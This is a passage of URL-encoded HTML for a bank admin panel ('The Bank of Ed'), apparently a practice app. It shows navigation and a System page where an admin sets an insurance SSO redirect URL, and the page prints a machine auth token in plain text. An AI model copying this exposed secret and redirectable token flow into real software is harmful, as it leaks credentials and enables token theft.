%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%20placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%